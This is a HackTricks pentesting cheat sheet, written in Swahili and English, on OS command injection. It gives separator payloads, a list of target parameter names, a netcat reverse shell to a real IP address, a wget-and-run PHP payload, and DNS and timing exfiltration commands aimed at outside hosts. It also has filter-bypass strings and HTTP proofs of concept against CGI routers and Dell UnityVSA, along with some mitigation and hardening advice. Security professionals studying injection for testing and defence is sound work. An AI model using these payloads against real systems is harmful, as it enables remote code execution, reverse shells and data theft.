# Command Injection

{{#include ../banners/hacktricks-training.md}}

## What is command Injection?

A **command injection** inaruhusu utekelezaji wa maagizo yoyote ya mfumo wa uendeshaji na mshambuliaji kwenye server inayohifadhi application. Matokeo yake, application na data zake zote zinaweza kuathiriwa kabisa. Utekelezaji wa maagizo haya kwa kawaida humruhusu mshambuliaji kupata upatikanaji usioidhinishwa au udhibiti juu ya mazingira ya application na mfumo wa msingi.

### Muktadha

Kulingana na **wapi ingizo lako linaingizwa** unaweza kuhitaji **kumaliza muktadha uliomo ndani ya nukuu** (ukitumia `"` au `'`) kabla ya maagizo.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Kizuizi** Bypasses

Ikiwa unajaribu kutekeleza **amri zozote ndani ya mashine ya linux** utapenda kusoma kuhusu **Bypasses:**

{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Mifano**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Vigezo

Hapa ni vigezo 25 vya juu vinavyoweza kuwa nyeti kwa code injection na udhaifu wa RCE unaofanana (kutoka [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Kutoa data: herufi kwa herufi
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Inategemea zana kutoka `https://github.com/HoLyVieR/dnsbin` pia imehifadhiwa kwenye dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Zana za mtandaoni za kukagua uondoaji wa data kwa kutumia DNS:

- dnsbin.zhack.ca
- pingb.in

### Kupita kwa vichujio

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Unapokagua back-end za JavaScript/TypeScript, mara nyingi utakutana na API ya Node.js `child_process`.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` huanzisha **shell** (`/bin/sh -c`), kwa hivyo alama yoyote ambayo ina maana maalum kwa shell (back-ticks, `;`, `&&`, `|`, `$()`, …) itasababisha **command injection** wakati pembejeo ya mtumiaji inachanganywa kwenye string.

**Kupunguza hatari:** tumia `execFile()` (au `spawn()` bila chaguo la `shell`) na toa **kila argument kama kipengele tofauti cha array** ili shell isihusishwe:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Kesi halisi: *Synology Photos* ≤ 1.7.0-0794 ilikuwa na udhaifu kupitia tukio la WebSocket bila uthibitisho ambalo liliweka data iliyodhibitiwa na mshambuliaji ndani ya `id_user`, ambayo baadaye ilingizwa katika wito la `exec()`, na kusababisha RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Not all injections require shell metacharacters. Iwapo application inapita mistari isiyotegemewa kama arguments kwa system utility (hata kwa `execve`/`execFile` na bila shell), programu nyingi bado zitachambua argument yoyote inayaanza na `-` au `--` kama option. Hii inampa attacker uwezo wa kubadili modes, kubadilisha output paths, au kuzusha tabia hatari bila hata kuingia kwenye shell.

Typical places where this appears:

- Embedded web UIs/CGI handlers ambazo hujenga commands kama `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, etc.
- Centralized CGI routers (e.g., `/cgi-bin/<something>.cgi` with a selector parameter like `topicurl=<handler>`) ambapo handlers nyingi zinatumia the same weak validator.

What to try:

- Toa values zinazoanza na `-`/`--` ili zitumike kama flags na tool inayofuata.
- Tumia vibaya flags zinazobadilisha tabia au kuandika files, kwa mfano:
- `ping`: `-f`/`-c 100000` ili kusababisha msongamano wa rasilimali kwa kifaa (DoS)
- `curl`: `-o /tmp/x` ili kuandika kwenye njia yoyote, `-K <url>` ili kupakia config inayodhibitiwa na attacker
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` ili kufanikisha utekelezaji baada ya rotation (post-rotate) katika wrappers zisizo salama
- Ikiwa program inaunga mkono `--` end-of-options, jaribu kuipita mitigations zisizo za busara zinazoweka `--` mahali pasipo sahihi.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (reachability and exploitation)

Mfano wa ulimwengu halisi: msimbo wa Perl huunda mnyororo wa amri za shell na kuuitekeleza kupitia backticks (au qx//). Katika mod_perl AccessHandler, vipengele vya ombi vinavyoathiriwa na mshambuliaji kama $r->uri() vinaweza kutiririka ndani ya mnyororo huo. Ikiwa tawi lolote linaunganisha ingizo ghafi kisha kulitekeleza kwa shell, utapata pre-auth RCE.

Vigezo hatarishi vya utekelezaji vya Perl (huanzisha shell wakati vinapopokea mnyororo mmoja):

- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimal vulnerable shape observed in the wild:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Mambo muhimu kuhusu ufikikaji katika mod_perl:
- Usajili wa handler: httpd.conf lazima iielekeze maombi kwenye Perl module yako, kwa mfano PerlModule MOD_SEC_EMC::AccessHandler na usanidi unaoitisha AccessHandler::handler kwa path scope.
- Kusukuma tawi dhaifu: lazimishe mtiririko wa login usiotambulishwa ili type == "login" (kwa mfano, acha auth cookie iliyotarajiwa).
- Path inayotatuliwa: hakikisha ombi lako linaelekezwa kwa URI inayotatuliwa ndani ya scope iliyosanidiwa. Ikiwa Apache haipeleki ombi kupitia handler, sink haitafikiwa.

Exploitation workflow
1) Kagua httpd.conf kwa PerlModule/MOD_PERL handler scopes ili kupata path inayotatuliwa inayosindika na handler.
2) Tuma ombi lisilotambulishwa ili njia ya login redirect ichukuliwe (type == "login").
3) Weka shell metacharacters katika request-URI path ili $r->uri() iweze kubeba payload yako ndani ya command string.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Vidokezo
- Jaribu separators: ;, &&, |, `backticks`, $(...), and encoded newlines (%0A) depending on quoting.
- Ikiwa patches za awali zinataja args nyingine lakini sio URI katika tawi moja, payloads zilizoongezwa mwishoni mwa string mara nyingi hufanya kazi: ;id# or &&/usr/bin/id#

Kuimarisha (Perl)
- Usijenge string za shell. Tumia argument-vector execution: system('/usr/bin/curl', '--silent', '--', $safe_url) — no shell.
- Ikiwa shell haiepukiki, escape kwa ukali na kwa uthabiti katika matawi yote; chukulia $r->uri() kama hatari. Consider URI::Escape for paths/queries and strong allowlists.
- Epuka backticks/qx// kwa kutekeleza amri; capture output via open3/list form ikiwa kwa kweli inahitajika bila kuita shell.
- Katika mod_perl handlers, weka auth/redirect code paths zisizo na utekelezaji wa amri au hakikisha sanitization sawa katika matawi yote ili kuepuka “fixed everywhere but one branch” regressions.

Uwindaji wa udhaifu
- Patch-diff modules zinazojenga shell commands; tazama kwa inconsistent quoting kati ya matawi (mfano, if ($type eq 'login') left unescaped).
- Grep for backticks, qx//, open\s*\(|\||, and system\s*\(\s* to find string-based shells. Build a call graph from sink to request entry ($r) to verify pre-auth reachability.

Mfano wa ulimwengu halisi: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw $uri ($r->uri()).
- Reachable through MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Practical nuance: use a resolvable path covered by the handler; otherwise the module won’t execute and the sink won’t be hit.

## Marejeleo

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
